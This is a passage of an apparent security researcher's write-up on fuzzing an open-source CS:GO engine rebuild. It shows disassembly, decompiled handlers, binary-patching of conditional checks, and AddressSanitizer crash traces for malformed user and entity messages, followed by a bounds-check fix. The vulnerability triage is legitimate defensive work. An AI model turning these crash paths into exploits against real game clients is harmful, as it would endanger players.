   0x7fffd7625790:	mov    DWORD PTR [rbp-0x8c],eax
   0x7fffd7625796:	lea    rax,[r14+0x10]
   0x7fffd762579a:	mov    DWORD PTR [rbp-0x80],edx
   0x7fffd762579d:	mov    QWORD PTR [rbp-0x40],rax
   0x7fffd76257a1:	lea    rax,[rip+0x166ef70]        # 0x7fffd8c94718
   0x7fffd76257a8:	cmp    r12w,0xffff
   0x7fffd76257ad:	mov    QWORD PTR [rbp-0x78],rax
   0x7fffd76257b1:	je     0x7fffd762581b
   0x7fffd76257b3:	mov    rdx,QWORD PTR [r13+0x8]
   0x7fffd76257b7:	jmp    0x7fffd76257d0
   0x7fffd76257b9:	nop    DWORD PTR [rax+0x0]
   0x7fffd76257c0:	mov    rdx,QWORD PTR [r13+0x8]
   0x7fffd76257c4:	movzx  r12d,WORD PTR [rdx+rbx*1]
   0x7fffd76257c9:	cmp    r12w,0xffff
(gdb) 

```
{% endraw %}




{% raw %}
```


undefined8 FUN_0084d5a0(long param_1,void *param_2,int param_3,undefined4 param_4)

{
  byte bVar1;
  int iVar2;
  uint uVar3;
  long lVar4;
  int iVar5;
  undefined8 uVar6;
  long lVar7;
  long lVar8;
  ulong __n;
  long lVar9;
  long lVar10;
  void *local_118;
  long local_110;
  int local_104;
  long local_f8;
  long local_e8;
  long local_d8;
  void *local_90;
  long local_88;
  undefined local_78 [16];
  undefined local_68 [16];
  undefined local_58 [16];
  undefined auStack72 [24];
  
  lVar4 = FUN_00859830(param_4);
  uVar6 = 0;
  if ((*(byte *)(lVar4 + 0xf) & 1) == 0) {
    iVar2 = param_3 >> 1;
    lVar4 = FUN_00859830(param_4);
    bVar1 = *(byte *)(lVar4 + 8);
    if (0 < iVar2) {
      __n = (ulong)bVar1;
      local_104 = 0;
      uVar3 = (uint)bVar1;
      lVar4 = (long)(int)(param_3 * uVar3);
      iVar5 = param_3 + -1;
      local_d8 = (long)(int)(param_3 * iVar5 * uVar3);
      local_e8 = (long)(int)((param_3 + 1) * iVar5 * uVar3);
      lVar7 = (long)(int)-(uint)bVar1;
      local_f8 = (long)(int)((uint)bVar1 * iVar5);
      local_118 = param_2;
      local_110 = param_1;
      do {
        lVar10 = 0;
        lVar9 = 0;
        lVar8 = 0;
        iVar5 = 0;
        local_90 = local_118;
        local_88 = local_110;
        do {
          __memcpy_chk(local_78,local_88,__n,0x40);
          __memcpy_chk(local_68,param_1 + local_d8 + lVar8,__n,0x30);
          __memcpy_chk(local_58,param_1 + lVar9 + local_e8,__n,0x20);
          __memcpy_chk(auStack72,param_1 + lVar10 + local_f8,__n,0x10);
          memcpy(local_90,auStack72,__n);
          memcpy((void *)((long)param_2 + local_d8 + lVar8),local_78,__n);
          memcpy((void *)((long)param_2 + lVar9 + local_e8),local_68,__n);
          memcpy((void *)((long)param_2 + lVar10 + local_f8),local_58,__n);
          local_88 = local_88 + __n;
          lVar8 = lVar8 + (int)(-param_3 * uVar3);
          lVar9 = lVar9 + lVar7;
          iVar5 = iVar5 + 1;
          lVar10 = lVar10 + lVar4;
          local_90 = (void *)((long)local_90 + __n);
        } while (iVar2 != iVar5);
        local_104 = local_104 + 1;
        local_e8 = local_e8 + (int)(-param_3 * uVar3);
        local_110 = local_110 + lVar4;
        local_118 = (void *)((long)local_118 + lVar4);
        local_d8 = local_d8 + __n;
        local_f8 = local_f8 + lVar7;
      } while (iVar2 != local_104);
    }
    uVar6 = 1;
  }
  return uVar6;
}


```
{% endraw %}


undefined ** FUN_00859830(int param_1)

{
  return &PTR_s_UNKNOWN_00f05260 + (long)(param_1 + 1) * 2;
}




I suspect that that is UserMessageHandlerMap_t::IndexType_t index = m_UserMessageBinderMap.Find( msg_type );


in usermessages.h :

UserMessageHandlerMap_t m_UserMessageBinderMap;

game/shared/usermessages.h:	typedef CUtlMap< int, CCopyableUtlVectorFixed< UserMessageBinderVec_t, MAX_SPLITSCREEN_PLAYERS > > UserMessageHandlerMap_t;





{% raw %}
```

	int Find( const T& src ) const
	{
		int nCount = Count();
		for ( int i = 0; i < nCount; ++i )
		{
			if (Element(i) == src)
				return i;
		}
		return -1;
	}

```
{% endraw %}



{% raw %}
```

template< typename T, class A >
inline T& CUtlVector<T, A>::Element( int i )
{
	Assert( i < m_Size );
	return m_Memory[ i ];
}

template< typename T, class A >
inline const T& CUtlVector<T, A>::Element( int i ) const
{
	Assert( i < m_Size );
	return m_Memory[ i ];
}

```
{% endraw %}


Now, the reason why I am not finding the use message function is because the CClientState::SVCMsg_UserMessage function is in engine_client.so when as the DispatchUserMessage function is in client_client.so :( .




This is the DispatchUserMessage which first calls Usermessages() and then ->DispatchUserMessage(); on this
{% raw %}
```




(gdb) x/22i $rip
=> 0x7fffca8094d0 <CHLClient::DispatchUserMessage(int, int, int, void const*)>:	endbr64 
   0x7fffca8094d4 <CHLClient::DispatchUserMessage(int, int, int, void const*)+4>:	push   r13
   0x7fffca8094d6 <CHLClient::DispatchUserMessage(int, int, int, void const*)+6>:	mov    r13d,ecx
   0x7fffca8094d9 <CHLClient::DispatchUserMessage(int, int, int, void const*)+9>:	push   r12
   0x7fffca8094db <CHLClient::DispatchUserMessage(int, int, int, void const*)+11>:	mov    r12d,edx
   0x7fffca8094de <CHLClient::DispatchUserMessage(int, int, int, void const*)+14>:	push   rbp
   0x7fffca8094df <CHLClient::DispatchUserMessage(int, int, int, void const*)+15>:	mov    ebp,esi
   0x7fffca8094e1 <CHLClient::DispatchUserMessage(int, int, int, void const*)+17>:	push   rbx
   0x7fffca8094e2 <CHLClient::DispatchUserMessage(int, int, int, void const*)+18>:	mov    rbx,r8
   0x7fffca8094e5 <CHLClient::DispatchUserMessage(int, int, int, void const*)+21>:	sub    rsp,0x8
   0x7fffca8094e9 <CHLClient::DispatchUserMessage(int, int, int, void const*)+25>:	call   0x7fffca97d670 <UserMessages()>
   0x7fffca8094ee <CHLClient::DispatchUserMessage(int, int, int, void const*)+30>:	add    rsp,0x8
   0x7fffca8094f2 <CHLClient::DispatchUserMessage(int, int, int, void const*)+34>:	mov    r8,rbx
   0x7fffca8094f5 <CHLClient::DispatchUserMessage(int, int, int, void const*)+37>:	mov    ecx,r13d
   0x7fffca8094f8 <CHLClient::DispatchUserMessage(int, int, int, void const*)+40>:	pop    rbx
   0x7fffca8094f9 <CHLClient::DispatchUserMessage(int, int, int, void const*)+41>:	mov    edx,r12d
   0x7fffca8094fc <CHLClient::DispatchUserMessage(int, int, int, void const*)+44>:	mov    esi,ebp
   0x7fffca8094fe <CHLClient::DispatchUserMessage(int, int, int, void const*)+46>:	mov    rdi,rax
   0x7fffca809501 <CHLClient::DispatchUserMessage(int, int, int, void const*)+49>:	pop    rbp
   0x7fffca809502 <CHLClient::DispatchUserMessage(int, int, int, void const*)+50>:	pop    r12
   0x7fffca809504 <CHLClient::DispatchUserMessage(int, int, int, void const*)+52>:	pop    r13
   0x7fffca809506 <CHLClient::DispatchUserMessage(int, int, int, void const*)+54>:	jmp    0x7fffca97ceb0 <CUserMessages::DispatchUserMessage(int, int, int, void const*)>


```
{% endraw %}

In the closed source version:


{% raw %}
```
(gdb) x/30i $rip
=> 0x7fffd71a3410:	push   rbp
   0x7fffd71a3411:	mov    rbp,rsp
   0x7fffd71a3414:	push   r13
   0x7fffd71a3416:	mov    r13d,ecx
   0x7fffd71a3419:	push   r12
   0x7fffd71a341b:	mov    r12d,edx
   0x7fffd71a341e:	push   rbx
   0x7fffd71a341f:	mov    ebx,esi
   0x7fffd71a3421:	sub    rsp,0x18
   0x7fffd71a3425:	mov    QWORD PTR [rbp-0x28],r8
   0x7fffd71a3429:	call   0x7fffd7342620
   0x7fffd71a342e:	mov    r8,QWORD PTR [rbp-0x28]
   0x7fffd71a3432:	add    rsp,0x18
   0x7fffd71a3436:	mov    ecx,r13d
   0x7fffd71a3439:	mov    edx,r12d
   0x7fffd71a343c:	mov    esi,ebx
   0x7fffd71a343e:	pop    rbx
   0x7fffd71a343f:	mov    rdi,rax
   0x7fffd71a3442:	pop    r12
   0x7fffd71a3444:	pop    r13
   0x7fffd71a3446:	pop    rbp
   0x7fffd71a3447:	jmp    0x7fffd7341cb0


   
   
   
   
   
   
After the jmp instruction:   
   
(gdb) where
#0  0x00007fffd7341cb0 in ?? () from /home/cyberhacker/.local/share/Steam/steamapps/common/Counter-Strike Global Offensive/csgo/bin/linux64/client_client.so
#1  0x00007fffed5eb7ae in ?? () from /home/cyberhacker/.local/share/Steam/steamapps/common/Counter-Strike Global Offensive/bin/linux64/engine_client.so
#2  0x00007fffed52b381 in ?? () from /home/cyberhacker/.local/share/Steam/steamapps/common/Counter-Strike Global Offensive/bin/linux64/engine_client.so
#3  0x00007fffed52cb41 in ?? () from /home/cyberhacker/.local/share/Steam/steamapps/common/Counter-Strike Global Offensive/bin/linux64/engine_client.so
#4  0x00007fffed52d4e6 in ?? () from /home/cyberhacker/.local/share/Steam/steamapps/common/Counter-Strike Global Offensive/bin/linux64/engine_client.so
#5  0x00007fffed53ee94 in ?? () from /home/cyberhacker/.local/share/Steam/steamapps/common/Counter-Strike Global Offensive/bin/linux64/engine_client.so
#6  0x00007fffed2fd7db in ?? () from /home/cyberhacker/.local/share/Steam/steamapps/common/Counter-Strike Global Offensive/bin/linux64/engine_client.so
#7  0x00007fffed4fed5b in ?? () from /home/cyberhacker/.local/share/Steam/steamapps/common/Counter-Strike Global Offensive/bin/linux64/engine_client.so
#8  0x00007fffed500fa4 in ?? () from /home/cyberhacker/.local/share/Steam/steamapps/common/Counter-Strike Global Offensive/bin/linux64/engine_client.so
#9  0x00007fffed50e927 in ?? () from /home/cyberhacker/.local/share/Steam/steamapps/common/Counter-Strike Global Offensive/bin/linux64/engine_client.so
#10 0x00007fffed50eda4 in ?? () from /home/cyberhacker/.local/share/Steam/steamapps/common/Counter-Strike Global Offensive/bin/linux64/engine_client.so
#11 0x00007fffed597f3a in ?? () from /home/cyberhacker/.local/share/Steam/steamapps/common/Counter-Strike Global Offensive/bin/linux64/engine_client.so
#12 0x00007fffed591bb2 in ?? () from /home/cyberhacker/.local/share/Steam/steamapps/common/Counter-Strike Global Offensive/bin/linux64/engine_client.so
#13 0x00007fffed591cd3 in ?? () from /home/cyberhacker/.local/share/Steam/steamapps/common/Counter-Strike Global Offensive/bin/linux64/engine_client.so
#14 0x00007fffed7c3be9 in ?? () from /home/cyberhacker/.local/share/Steam/steamapps/common/Counter-Strike Global Offensive/bin/linux64/engine_client.so
#15 0x00007fffed59412c in ?? () from /home/cyberhacker/.local/share/Steam/steamapps/common/Counter-Strike Global Offensive/bin/linux64/engine_client.so
#16 0x00007ffff5d2cc69 in ?? () from bin/linux64/launcher_client.so
#17 0x00007ffff5d2cc69 in ?? () from bin/linux64/launcher_client.so
#18 0x00007ffff5d01b31 in LauncherMain () from bin/linux64/launcher_client.so
#19 0x00007ffff79ca083 in __libc_start_main (main=0x400650 <main>, argc=12, argv=0x7fffffffd418, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7fffffffd408) at ../csu/libc-start.c:308
#20 0x00000000004006fd in _start ()
(gdb) 

```
{% endraw %}


This is the DispatchUserMessage function in the closed source client_client.so : 

{% raw %}
```
(gdb) x/20b $rip
0x7fffd7341cb0:	0x55	0x48	0x89	0xe5	0x41	0x57	0x45	0x31
0x7fffd7341cb8:	0xff	0x41	0x56	0x4c	0x8d	0x75	0x80	0x41
0x7fffd7341cc0:	0x55	0x49	0x89	0xfd


```
{% endraw %}



Here it is in ghidra:

{% raw %}
```
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined FUN_00b23cb0()
             undefined         AL:1           <RETURN>
                             FUN_00b23cb0                                    XREF[5]:     01b7c30c, 01c7f38c(*), 
                                                                                          01f12155(*), 01f12160(*), 
                                                                                          01f1216c(*)  
        00b23cb0 55              ??         55h    U
        00b23cb1 48              ??         48h    H
        00b23cb2 89              ??         89h
        00b23cb3 e5              ??         E5h
        00b23cb4 41              ??         41h    A
        00b23cb5 57              ??         57h    W
        00b23cb6 45              ??         45h    E

```
{% endraw %}


Ok my plan is to jump into the message handler in the closed source binary to see what they have changed.

The client does not call the handler for some odd reason. Looking at the decompiled version of the closed source binary and comparing it to the compiled version I see that the checks to some convar still exists:

Closed source:

{% raw %}
```
    if (local_a0._6_1_ == 0) {
      if (handler == (long *)0x0) {
        DevMsg("CUserMessages::DispatchUserMessage:  Parse error msg type=%i\n",(ulong)msg_type);
        goto LAB_00b23e93;
      }
      plVar11 = (long *)&DAT_02d0e440;
      if (DAT_02d0e478 == (long *)&DAT_02d0e440) {
                    /* WARNING: Subroutine does not return */
        FUN_01423560(&DAT_02d0e440);
      }
      if (*(code **)(*DAT_02d0e478 + 0x80) == FUN_0084e980) {
        plVar7 = (long *)DAT_02d0e478[7];
        if (plVar7 == DAT_02d0e478) {
LAB_00b24207:
                    /* WARNING: Subroutine does not return */
          FUN_01423560(plVar7);
        }
        pcVar6 = *(code **)(*plVar7 + 0x80);
        if (pcVar6 == FUN_0084e980) {
          plVar5 = (long *)plVar7[7];
          if (plVar7 == plVar5) goto LAB_00b24207;
          pcVar6 = *(code **)(*plVar5 + 0x80);
          if (pcVar6 != FUN_0084e980) {
LAB_00b241d8:
            iVar12 = (*pcVar6)(plVar5);
            goto LAB_00b23fc0;
          }
          plVar7 = (long *)plVar5[7];
          if (plVar5 == plVar7) {
LAB_00b24287:
                    /* WARNING: Subroutine does not return */
            FUN_01423560(plVar5);
          }
          pcVar6 = *(code **)(*plVar7 + 0x80);
          if (pcVar6 == FUN_0084e980) {
            plVar5 = (long *)plVar7[7];
            if (plVar7 == plVar5) goto LAB_00b24207;
            pcVar6 = *(code **)(*plVar5 + 0x80);
            if (pcVar6 != FUN_0084e980) goto LAB_00b241d8;
            plVar7 = (long *)plVar5[7];
            if (plVar5 == plVar7) goto LAB_00b24287;
            pcVar6 = *(code **)(*plVar7 + 0x80);
            if (pcVar6 == FUN_0084e980) {
              if (plVar7 == (long *)plVar7[7]) goto LAB_00b24207;
              iVar12 = (**(code **)(*(long *)plVar7[7] + 0x80))();
              goto LAB_00b23fc0;
            }
          }
        }
        iVar12 = (*pcVar6)(plVar7);
      }
      else {
        iVar12 = (**(code **)(*DAT_02d0e478 + 0x80))();
      }
LAB_00b23fc0:
      if (iVar12 != 0) {
        (**(code **)(*handler + 0x48))(handler);
        (**(code **)(*handler + 0x10))(local_98,handler);
                    /* try { // try from 00b2400a to 00b2400e has its CatchHandler @ 00b2438e */
        Msg("DispatchUserMessage - %s(%d) bytes: %d\n",local_98[0],msg_type);
        if ((undefined8 *)(&DAT_ffffffffffffffe8 + local_98[0]) !=
            &std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Rep::
             _S_empty_rep_storage) {
          LOCK();
          piVar1 = (int *)(local_98[0] + -8);
          iVar12 = *piVar1;
          *piVar1 = *piVar1 + -1;
          if (iVar12 < 1) {
            std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Rep::_M_destroy
                      ((allocator *)(&DAT_ffffffffffffffe8 + local_98[0]));
          }
        }
        if (DAT_02d0e478 == (long *)&DAT_02d0e440) {
LAB_00b241e2:
                    /* WARNING: Subroutine does not return */
          FUN_01423560(plVar11);
        }
        if (*(code **)(*DAT_02d0e478 + 0x80) == FUN_0084e980) {
          plVar11 = (long *)DAT_02d0e478[7];


```
{% endraw %}

our version:


{% raw %}
```

          uVar5 = (uint)local_92[0];
          if (local_92[0] == 0) {
            if (plVar6 == (long *)0x0) {
              DevMsg("CUserMessages::DispatchUserMessage:  Parse error msg type=%i\n",
                     (ulong)(uint)param_1);
            }
            else {
              if (cl_show_usermessage._56_8_ == (long *)cl_show_usermessage) {
                uVar5 = cl_show_usermessage._88_4_ ^ 0x1ef7a00;
              }
              else {
                if (*(code **)(*cl_show_usermessage._56_8_ + 0x80) == ConVar::GetInt) {
                  if (cl_show_usermessage._56_8_ == (long *)cl_show_usermessage._56_8_[7]) {
                    uVar5 = (uint)cl_show_usermessage._56_8_ ^
                            *(uint *)(cl_show_usermessage._56_8_ + 0xb);
                  }
                  else {
                    uVar5 = (**(code **)(*(long *)cl_show_usermessage._56_8_[7] + 0x80))();
                  }
                }
                else {
                  uVar5 = (**(code **)(*cl_show_usermessage._56_8_ + 0x80))();
                }
              }
              if (uVar5 != 0) {
                (**(code **)(*plVar6 + 0x48))(plVar6);
                (**(code **)(*plVar6 + 0x10))(&local_90,plVar6);
                    /* try { // try from 009aa118 to 009aa11c has its CatchHandler @ 009aa3a4 */
                Msg("DispatchUserMessage - %s(%d) bytes: %d\n",local_90,param_1);
                if ((undefined4 *)(&DAT_ffffffffffffffe8 + local_90) !=
                    &std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Rep::
                     _S_empty_rep_storage) {
                  LOCK();
                  piVar1 = (int *)(local_90 + -8);
                  iVar9 = *piVar1;
                  *piVar1 = *piVar1 + -1;
                  if (iVar9 < 1) {
                    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Rep::
                    _M_destroy((allocator *)(&DAT_ffffffffffffffe8 + local_90));
                  }
                }
                if (cl_show_usermessage._56_8_ == (long *)cl_show_usermessage) {
                  uVar5 = cl_show_usermessage._88_4_ ^ 0x1ef7a00;
                }
                else {
                  if (*(code **)(*cl_show_usermessage._56_8_ + 0x80) == ConVar::GetInt) {
                    plVar3 = (long *)cl_show_usermessage._56_8_[7];
                    if (cl_show_usermessage._56_8_ == plVar3) {




```
{% endraw %}


See? Now we only need to find out what that convar is! That, or we can just patch out the comparisons in the binary!




First patch this JZ shit out:

{% raw %}
```

                             LAB_00b23fc0                                    XREF[3]:     00b241dd(j), 00b241fb(j), 
                                                                                          00b24202(j)  
        00b23fc0 85 c0           TEST       EAX,EAX
        00b23fc2 0f 84 85        JZ         LAB_00b2414d
                 01 00 00
        00b23fc8 49 8b 04 24     MOV        RAX,qword ptr [index]
        00b23fcc 4c 8d bd        LEA        R15=>local_98,[RBP + -0x90]
                 70 ff ff ff
        00b23fd3 4c 89 e7        MOV        this,index

```
{% endraw %}




and then this JG shit out:

{% raw %}
```
                             LAB_009aa17c                                    XREF[3]:     009aa325(j), 009aa340(j), 
                                                                                          009aa34a(j)  
        009aa17c 41 83 fc 01     CMP        R12D,0x1
        009aa180 0f 8f 2a        JG         LAB_009aa2b0
                 01 00 00
                             LAB_009aa186                                    XREF[4]:     009aa0de(j), 009aa2da(j), 
                                                                                          009aa2fa(j), 009aa30a(j)  
        009aa186 48 8b 43 08     MOV        RAX,qword ptr [RBX + 0x8]
        009aa18a 45 31 f6        XOR        R14D,R14D


```
{% endraw %}


After patching stuff out I see that I do not even hit this:

{% raw %}
```
                             LAB_00b23fc0                                    XREF[3]:     00b241dd(j), 00b241fb(j), 
                                                                                          00b24202(j)  
        00b23fc0 85 c0           TEST       EAX,EAX
        00b23fc2 0f 84 85        JZ         LAB_00b2414d
                 01 00 00
        00b23fc8 49 8b 04 24     MOV        RAX,qword ptr [index]
        00b23fcc 4c 8d bd        LEA        R15=>local_98,[RBP + -0x90]
                 70 ff ff ff

```
{% endraw %}


There isn't anything in the console.log, so that makes me think that this code block:

{% raw %}
```
	bool bSilentIgnore = false;
	::google::protobuf::Message *pMsg = pHandler->Parse( nPassthroughFlags, msg, size, bSilentIgnore );

	if ( bSilentIgnore )
	{
		if ( pMsg )
			delete pMsg;
		//DevMsg( "CUserMessages::DispatchUserMessage: Silently ignoring alt-timeline msg type %i\n", msg_type );
		return true;
	}
```
{% endraw %}

Gets ran aka the parser returns bSilentIgnore .

Other possibility is that this code block:

{% raw %}
```
	IUserMessageBinder *pHandler = m_UserMessageBinderMap.Element( index )[ nSlot ][0];
	if ( !pHandler )
	{
		// not hooking a usermessage is acceptable, pretend we parsed it
		return true;
	}

```
{% endraw %}

Gets ran.

In disassembly here are the relevant opcodes:

{% raw %}
```

        00b23e2b 4b 8d 1c a4     LEA        RBX,[R12 + R12*0x4]
        00b23e2f 48 c1 e3 04     SHL        RBX,0x4
        00b23e33 48 89 d8        MOV        RAX,RBX
        00b23e36 49 03 45 08     ADD        RAX,qword ptr [R13 + 0x8]
        00b23e3a 8b 70 30        MOV        msg_type,dword ptr [RAX + 0x30]
        00b23e3d 85 f6           TEST       msg_type,msg_type
        00b23e3f 74 7f           JZ         LAB_00b23ec0
        00b23e41 48 8b 40 20     MOV        RAX,qword ptr [RAX + 0x20]
        00b23e45 48 8b 38        MOV        this,qword ptr [RAX]
        00b23e48 48 85 ff        TEST       this,this
        00b23e4b 74 73           JZ         LAB_00b23ec0
        00b23e4d c6 85 6e        MOV        byte ptr [RBP + local_a0+0x6],0x0
                 ff ff ff 00
        00b23e54 48 8b 07        MOV        RAX,qword ptr [this]
        00b23e57 4c 8d 85        LEA        msg=>local_a0+0x6,[RBP + -0x92]
                 6e ff ff ff



```
{% endraw %}

In the decompilation this assembly equates to this source code:

{% raw %}
```
  lVar9 = index * 0x50;
  if ((*(int *)(this[1] + lVar9 + 0x30) == 0) ||
     (handler = **(long ***)(this[1] + lVar9 + 0x20), handler == (long *)0x0)) {
LAB_00b23ec0:
    uVar4 = 1;
  }
  else {
    local_a0._6_1_ = 0;
```
{% endraw %}

After fiddling a while I realized that the reason why there are no messages in the log is that I have the ConVar developer set to zero when as it should be set to 4 for max debugging messages. After doing this I finally have the message in the log: 

{% raw %}
```
CUserMessages::DispatchUserMessage:  Unknown msg type 26
Couldn't dispatch user message (26)
```
{% endraw %}

Looking at the newer usermessages which are in this github repository: https://github.com/SteamDatabase/Protobufs . Looking at the user messages it seems that they changed it such that the cstrike15 user messages are 300+x where x is the original message id, so if we want to send a user message of type 26 then we actually need to send it as 326.

After modifying the message_type to 326 we get the same error:

{% raw %}
```
UDP <-       CLIENT       127.0.0.1:27016: sz=   42 seq=    1 ack=    1 rel=0 tm= 192.410 wire=48
CUserMessages::DispatchUserMessage:  Unknown msg type 326
UDP ->       CLIENT       127.0.0.1:27016: sz=  251 seq=   16 ack=    1 rel=1 tm= 192.512

```
{% endraw %}

I made a quick patching script which tries to find the addresses of the sv_show_usermessage checks in the binary client_client.so . I patched out that stuff and then I played the game a little and as it turns out, the ReloadEffect user message does not occur anywhere. :(  This most likely indicates that they patched that exploit out of the new version of csgo. I think that the best course of action at this point is to just patch the bug out of the fuzzing version aka just ignore ReloadEffect messages and just immediately return True .

When looking at other crashes which the fuzzer found there is this:

{% raw %}
```
==ERROR: AddressSanitizer: SEGV on unknown address 0x01007fff801e (pc 0x7ff5f883ab5e bp 0x7fffa05f60f0 sp 0x7fffa05f5fe0 T0)
==152908==The signal is caused by a READ memory access.
    #0 0x7ff5f883ab5d in CClientState::SVCMsg_EntityMsg(CSVCMsg_EntityMsg const&) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/servermsghandler.cpp:756
    #1 0x7ff5f84d0708 in CNetChan::_ProcessMessages(bf_read&, bool) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_chan.cpp:2568
    #2 0x7ff5f84d1e02 in CNetChan::ProcessMessages(bf_read&, bool) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_chan.cpp:2413
    #3 0x7ff5f84df689 in CNetChan::ProcessPacket(netpacket_s*, bool) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_chan.cpp:3195
    #4 0x7ff5f851b011 in replaypacket(CNetChan*, int) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_ws.cpp:2431
    #5 0x7ff5f8526d7f in NET_ProcessSocket(int, IConnectionlessPacketHandler*) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_ws.cpp:2578
    #6 0x7ff5f79974aa in CL_ReadPackets(bool) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/cl_main.cpp:512
    #7 0x7ff5f844d394 in _Host_RunFrame_Client(bool) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host.cpp:3368
    #8 0x7ff5f8453257 in _Host_RunFrame(float) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host.cpp:4283
    #9 0x7ff5f845e06c in Host_RunFrame(float) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host.cpp:4693
    #10 0x7ff5f8483840 in CHostState::State_Run(float) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host_state.cpp:611
    #11 0x7ff5f8484af3 in CHostState::FrameUpdate(float) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/host_state.cpp:808
    #12 0x7ff5f86c37a9 in CEngine::Frame() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_engine.cpp:572
    #13 0x7ff5f86b396f in CEngineAPI::MainLoop() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:1161
    #14 0x7ff5f86b3ec4 in CModAppSystemGroup::Main() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:2416
    #15 0x7ff5f86b3ec4 in CModAppSystemGroup::Main() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:2374
    #16 0x7ff5f8e497df in CAppSystemGroup::Run() /home/cyberhacker/Codecoveragething/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #17 0x7ff5f86b9c22 in CEngineAPI::RunListenServer() /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/sys_dll2.cpp:1437
    #18 0x7ff5fd00401f in CAppSystemGroup::Run() /home/cyberhacker/Codecoveragething/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #19 0x7ff5fd00401f in CAppSystemGroup::Run() /home/cyberhacker/Codecoveragething/Kisak-Strike/appframework/AppSystemGroup.cpp:775
    #20 0x7ff5fcfec995 in LauncherMain /home/cyberhacker/Codecoveragething/Kisak-Strike/launcher/launcher.cpp:1897
    #21 0x7ff60068e082 in __libc_start_main ../csu/libc-start.c:308
    #22 0x55ad1e02727d in _start (/home/cyberhacker/Codecoveragething/game/csgo_linux64+0x127d)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/servermsghandler.cpp:756 in CClientState::SVCMsg_EntityMsg(CSVCMsg_EntityMsg const&)
==152908==ABORTING


```
{% endraw %}


When I looked into this it seems that we found this bug: https://hackerone.com/reports/584603 . 😅 . Someone got to this faster than I did it seems. Maybe we can see if the fix for this is insufficient? Anyway, that is for another time.

So I am going to also fix this bug out of the fuzzed version.

{% raw %}
```
abstract_class IClientEntityList
{
public:
	// Get IClientNetworkable interface for specified entity
	virtual IClientNetworkable*	GetClientNetworkable( int entnum ) = 0;
	virtual IClientNetworkable*	GetClientNetworkableFromHandle( CBaseHandle hEnt ) = 0;
	virtual IClientUnknown*		GetClientUnknownFromHandle( CBaseHandle hEnt ) = 0;

	// NOTE: This function is only a convenience wrapper.
	// It returns GetClientNetworkable( entnum )->GetIClientEntity().
	virtual IClientEntity*		GetClientEntity( int entnum ) = 0;
	virtual IClientEntity*		GetClientEntityFromHandle( CBaseHandle hEnt ) = 0;

	// Returns number of entities currently in use
	virtual int					NumberOfEntities( bool bIncludeNonNetworkable ) = 0;

	// Returns highest index actually used
	virtual int					GetHighestEntityIndex( void ) = 0;

	// Sizes entity list to specified size
	virtual void				SetMaxEntities( int maxents ) = 0;
	virtual int					GetMaxEntities( ) = 0;
	virtual EntityCacheInfo_t	*GetClientNetworkableArray() = 0;
};

extern IClientEntityList *entitylist;
```
{% endraw %}


original code:

{% raw %}
```

bool CClientState::SVCMsg_EntityMsg( const CSVCMsg_EntityMsg& msg )
{
	// Look up entity
	IClientNetworkable *entity = entitylist->GetClientNetworkable( msg.ent_index() );

	if ( !entity )
	{
		int idx = queuedmessage.AddToTail();

		CQueuedEntityMessage *pMessage = &queuedmessage[idx];
		pMessage->m_msg.CopyFrom( msg );	
		return true;
	}

```
{% endraw %}

new code:

{% raw %}
```
bool CClientState::SVCMsg_EntityMsg( const CSVCMsg_EntityMsg& msg )
{
	
	// Bounds check.
	if (msg.ent_index() >= entitylist->GetHighestEntityIndex()) {
		return true;
	}
	// Look up entity
	IClientNetworkable *entity = entitylist->GetClientNetworkable( msg.ent_index() );

	if ( !entity )
	{
		int idx = queuedmessage.AddToTail();

		CQueuedEntityMessage *pMessage = &queuedmessage[idx];
		pMessage->m_msg.CopyFrom( msg );	
		return true;
	}


```
{% endraw %}

This should fix this bug.

One final bug which the fuzzer found during fuzzing is a boring null pointer dereference in MsgText .

{% raw %}
```
==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7fb341f88c1b bp 0x7ffc89a8eff0 sp 0x7ffc89a8c230 T0)
==176568==The signal is caused by a READ memory access.
==176568==Hint: address points to the zero page.
    #0 0x7fb341f88c1a in std::string::c_str() const /usr/include/c++/9/bits/basic_string.h:5199
    #1 0x7fb341f88c1a in __MsgFunc_TextMsg /home/cyberhacker/Codecoveragething/Kisak-Strike/game/client/cstrike15/RocketUI/rkhud_chat.cpp:112
    #2 0x7fb340bcf9ef in CUserMessages::DispatchUserMessage(int, int, int, void const*) /home/cyberhacker/Codecoveragething/Kisak-Strike/game/shared/usermessages.cpp:97
    #3 0x7fb353d5f546 in CClientState::SVCMsg_UserMessage(CSVCMsg_UserMessage const&) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/servermsghandler.cpp:727
    #4 0x7fb3539f6708 in CNetChan::_ProcessMessages(bf_read&, bool) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_chan.cpp:2568
    #5 0x7fb3539f7e02 in CNetChan::ProcessMessages(bf_read&, bool) /home/cyberhacker/Codecoveragething/Kisak-Strike/engine/net_chan.cpp:2413
